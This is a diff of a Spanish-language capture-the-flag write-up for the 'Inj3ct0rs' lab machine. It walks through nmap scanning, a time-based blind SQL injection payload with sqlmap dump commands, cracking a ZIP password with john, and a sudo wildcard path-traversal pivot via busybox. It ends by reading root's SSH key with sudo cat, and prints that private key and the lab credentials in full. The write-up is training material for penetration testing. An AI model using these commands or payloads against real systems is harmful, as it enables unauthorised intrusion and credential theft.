@@ -1,127 +1,191 @@
-# Reporte de Intrusión y Auditoría: Máquina Inj3ct0rs
 
-Este documento detalla el proceso paso a paso de la auditoría de seguridad realizada sobre la máquina **Inj3ct0rs**, logrando el compromiso total del sistema desde el vector de acceso inicial hasta la obtención de privilegios de superusuario (`root`).
+```markdown
+# Reporte Técnico de Intrusión: Máquina Inj3ct0rs
+
+Este reporte documenta la auditoría de seguridad y el proceso de explotación de la máquina **Inj3ct0rs**, detallando los hallazgos técnicos, comandos ejecutados y la obtención de privilegios hasta el control total del sistema (`root`).
 
 ---
 
-## 1. Fase de Despliegue e Inicialización
+## 1. Despliegue del Entorno
 
-Para iniciar el entorno controlado de pruebas, se procedió a descomprimir el paquete de la máquina y ejecutar el script de despliegue automatizado en Docker.
+El laboratorio se inicializó en un entorno controlado mediante la descompresión del paquete principal y la ejecución del script de despliegue automatizado:
 
-```python
-
+```bash
 unzip inj3ct0rs.zip
 bash auto_run.sh inj3ct0rss.tar
 
-Resultado del despliegue:
-
-
-IP Asignada en la red local: 172.17.0.2
 ```
 
-Mecanismo de limpieza: Al concluir el análisis, la terminación del script mediante Ctrl+C destruye de manera segura el contenedor para evitar la persistencia de residuos en el sistema anfitrión.
+* **IP Asignada:** `172.17.0.2` (Target final detectado en los logs: `172.22.0.2`)
+* **Nota Operativa:** Al finalizar la auditoría, el uso de `Ctrl+C` detiene el script y destruye automáticamente el contenedor, garantizando la limpieza de archivos basura en el sistema host.
 
-2. Reconocimiento y Escaneo de Puertos
-Se ejecutó un escaneo inicial con nmap utilizando técnicas de escaneo rápido (-sS) a alta velocidad, seguido de una inspección detallada de servicios y versiones (-sCV).
+---
 
-Bash
-# Identificación de puertos abiertos
-nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
+## 2. Reconocimiento y Escaneo de Puertos
 
-# Análisis detallado de servicios activos
-nmap -sCV -p22,80 <IP>
-Resultados de la Auditoría de Puertos
-Puerto	Estado	Servicio	Versión
-22/tcp	Abierto	SSH	OpenSSH 9.6p1 (Ubuntu Linux)
-80/tcp	Abierto	HTTP	Apache httpd 2.4.58 (Ubuntu)
-Al inspeccionar el servicio web expuesto en el puerto 80, se identificó un aplicativo que implementa funciones básicas de autenticación (login.php) y gestión de usuarios (Registro). Debido a la interacción con sistemas gestores de bases de datos, se priorizó evaluar el formulario ante vulnerabilidades de inyección de código.
+Se realizaron dos fases de escaneo con `nmap`. La primera para descubrir puertos abiertos y la segunda para enumerar versiones y scripts por defecto.
 
-3. Explotación: Vulnerabilidad SQL Injection (SQLi)
-Mediante la interceptación del tráfico con Burp Suite, se capturó la petición POST dirigida al archivo de autenticación y se almacenó en el archivo local request.txt:
+```bash
+# Escaneo rápido de todos los puertos (TCP)
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.22.0.2
 
-HTTP
+# Escaneo de servicios y versiones objetivo
+nmap -sCV -p22,80 172.22.0.2
+
+```
+
+### Servicios Detectados:
+
+* **Puerto 22/TCP (SSH):** OpenSSH 9.6p1 Ubuntu (3ubuntu13.4).
+* **Puerto 80/TCP (HTTP):** Apache httpd 2.4.58 (Ubuntu). Título del sitio: *Inj3ct0rs CTF - Página Principal*.
+* **Backend:** Presencia de un servidor de bases de datos MySQL evidenciado en las funciones de Login y Registro de la web.
+
+---
+
+## 3. Vector de Acceso Inicial: SQL Injection (SQLi)
+
+Al analizar los formularios web, se interceptó la petición POST del login en `/content_pages_hidden/db.php` utilizando Burp Suite, guardando el contenido en un archivo llamado `request.txt`:
+
+```http
 POST /content_pages_hidden/db.php HTTP/1.1
 Host: 172.22.0.2
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 29
+Connection: close
+Referer: [http://172.22.0.2/login.php](http://172.22.0.2/login.php)
 
 username=admin&password=admin
-Utilizando la suite de pruebas automatizadas sqlmap, se confirmó la existencia de una vulnerabilidad de Inyección SQL basada en tiempo (Time-based blind) sobre el parámetro password.
 
-Proceso de Enumeración y Extracción
-Bases de Datos Descubiertas: injectors_db, information_schema, mysql, sys.
+```
 
-Estructura Interna: Extracción de la tabla users y sus respectivas columnas (id, username, password).
+Se procedió a automatizar la inyección con `sqlmap`, detectando que el parámetro `password` es vulnerable a **Time-based blind** (Inyección ciega basada en tiempo) utilizando el payload:
+`admin' AND (SELECT 1525 FROM (SELECT(SLEEP(5)))JwlH) AND 'NaxG'='NaxG`
 
-El volcado final de las credenciales alojadas en el sistema arrojó la siguiente base de datos de usuarios:
+### Fases de Extracción de Datos con SQLMap:
 
-ID	Usuario	Contraseña / String obtenido
-1	root	loveyou
-2	jane	chicago123
-3	admin	password
-4	ralf	no_mirar_en_este_directorio
-4. Análisis de Directorios Ocultos y Criptoanálisis
-Las contraseñas obtenidas no contaban con validez directa en el servicio SSH. No obstante, el registro asociado al usuario ralf sugería una ruta en la estructura web. Al navegar al directorio:
+```bash
+# 1. Enumerar bases de datos
+sqlmap -r request.txt --dbs
 
-Plaintext
-http://<IP>/no_mirar_en_este_directorio/
-Se localizó un archivo comprimido bajo el nombre de secret.zip. Debido a que requería autenticación por contraseña para su lectura, se extrajo su firma criptográfica y se procedió a un ataque de fuerza bruta empleando el diccionario rockyou.txt.
+# 2. Enumerar tablas de la base de datos objetivo
+sqlmap -r request.txt -D injectors_db --tables
 
-Bash
-zip2john secret.zip > hash_zip
-john --wordlist=/usr/share/wordlists/rockyou.txt hash_zip
-Contraseña del ZIP identificada: computer
+# 3. Enumerar columnas de la tabla identificada
+sqlmap -r request.txt -D injectors_db -T users --columns
 
-Al extraer el interior del archivo comprimido, se descubrió el archivo confidencial.txt, el cual contenía un recordatorio de actualización de accesos para el personal de sistemas:
+# 4. Volcado de credenciales
+sqlmap -r request.txt -D injectors_db -T users -C id,username,password --dump
 
-Credenciales de Acceso Válidas:
+```
 
-Usuario: ralf
+### Tabla de Usuarios Extraída:
 
-Contraseña: supersecurepassword
+| id | username | password |
+| --- | --- | --- |
+| 1 | **root** | `loveyou` |
+| 2 | **jane** | `chicago123` |
+| 3 | **admin** | `password` |
+| 4 | **ralf** | `no_mirar_en_este_directorio` |
 
-5. Acceso Inicial y Pivoteo de Usuarios
-Haciendo uso de las credenciales web recuperadas, se estableció la primera conexión al servidor de manera remota a través del protocolo seguro SSH:
+---
 
-Bash
-ssh ralf@<IP>
-Captura de Primera Bandera
-Ubicación: /home/ralf/user.txt
+## 4. Análisis de Directorios y Criptoanálisis (Fuerza Bruta)
 
-Hash: 382af2fb41eb95b1d6c6358b6c55ffce
+La contraseña del usuario ralf (`no_mirar_en_este_directorio`) apuntaba a la existencia de una ruta web oculta: `http://172.22.0.2/no_mirar_en_este_directorio/`. Al acceder, se descargó el archivo protegido `secret.zip`.
 
-Movimiento Lateral hacia el Usuario capa
-Se inspeccionó la configuración de permisos del usuario mediante el comando sudo -l, identificando la siguiente regla de ejecución:
+### Craqueo del archivo ZIP:
 
-Plaintext
+Se extrajo el hash del archivo comprimido y se realizó un ataque de fuerza bruta con `john` y el diccionario corporativo/por defecto:
+
+```bash
+zip2john secret.zip > hash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+
+```
+
+* **Contraseña del ZIP descubierta:** `computer`
+
+Al descomprimir con `unzip secret.zip` e inspeccionar el archivo `confidencial.txt`, se obtuvieron las credenciales reales de acceso SSH:
+
+```text
+You have to change your password ralf, I have told you many times...
+Your new credentials are: ralf:supersecurepassword
+
+```
+
+---
+
+## 5. Intrusión y Movimiento Lateral (Usuario: capa)
+
+Se estableció acceso inicial por SSH al servidor:
+
+```bash
+ssh ralf@172.22.0.2
+
+```
+
+* **Flag de Usuario (1/2):** Acceso al archivo `user.txt` con hash `382af2fb41eb95b1d6c6358b6c55ffce`.
+
+### Pivoteo al usuario `capa`:
+
+Al ejecutar `sudo -l`, se detectó que el usuario `ralf` puede ejecutar un binario específico como el usuario `capa` sin proporcionar contraseña:
+
+```text
 (capa : capa) NOPASSWD: /usr/local/bin/busybox /nothing/*
-El comodín de ruta (*) implementado en la política de sudo permite un vector de evasión mediante Path Traversal. Al concatenar caracteres de retroceso de directorio (../), es posible desviar el flujo de ejecución fuera del entorno restringido de /nothing/ y forzar al sistema a ejecutar binarios arbitrarios con los privilegios del usuario capa.
 
-Bash
-# Evasión de restricción y ejecución de terminal
+```
+
+Aprovechando el uso del comodín `*`, se aplicó una técnica de **Path Traversal** para evadir la restricción del directorio `/nothing/` y forzar la ejecución de una shell:
+
+```bash
 sudo -u capa /usr/local/bin/busybox /nothing/../usr/bin/sh
-
-# Upgrade a shell interactiva
 /bin/bash
-6. Escalada de Privilegios a root
-Nuevamente dentro del contexto del nuevo usuario capa, se listaron sus privilegios administrativos asignados en el archivo /etc/sudoers:
 
-Plaintext
-(ALL : ALL) NOPASSWD: /bin/cat
-La capacidad de ejecutar el binario /bin/cat bajo el contexto de cualquier usuario sin autenticación permite la lectura directa de archivos críticos del sistema. Para asegurar un acceso persistente y sin restricciones, se extrajo la clave privada SSH correspondiente a la identidad del superusuario:
+```
 
-Bash
+---
+
+## 6. Escalada de Privilegios a Root
+
+Dentro del contexto del usuario `capa`, se revisaron nuevamente los privilegios de sudo disponibles en el sistema mediante `sudo -l`:
+
+```text
+User capa may run the following commands:
+    (ALL : ALL) NOPASSWD: /bin/cat
+
+```
+
+Dado que el binario `/bin/cat` se puede ejecutar con privilegios de cualquier usuario (incluido `root`), se procedió a leer de forma legítima la clave privada SSH del administrador:
+
+```bash
 sudo /bin/cat /root/.ssh/id_rsa
-Establecimiento del Acceso de Superusuario
-La clave SSH recuperada fue volcada a nuestra máquina de control, modificando sus propiedades de seguridad a fin de cumplir con las políticas restrictivas de OpenSSH:
 
-Bash
-nano id_rsa  # Transferencia de clave privada
+```
+
+### Captura de la Clave Privada (id_rsa):
+
+```text
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+
+```
+
+Para concluir el compromiso de la máquina, se guardó la clave en el host atacante, se configuraron los permisos correspondientes (`600`) para validar la identidad ante OpenSSH y se inició sesión como el usuario administrador:
+
+```bash
+# Importación y configuración de la llave privada
+nano id_rsa
 chmod 600 id_rsa
-ssh -i id_rsa root@<IP>
-Al concluir este paso, se obtuvo control absoluto e irrestricto sobre la máquina auditada.
 
-Captura de Segunda Bandera (Sistemas)
-Ubicación: /root/true_root.txt
+# Conexión final de root
+ssh -i id_rsa root@172.22.0.2
 
-Hash: 8e776bdaed0b6748686b7ce6d38ccca3
+```
+
+* **Flag del Administrador (2/2):** Acceso al archivo `/root/true_root.txt` con contenido `8e776bdaed0b6748686b7ce6d38ccca3`.
+
+```
+
+```
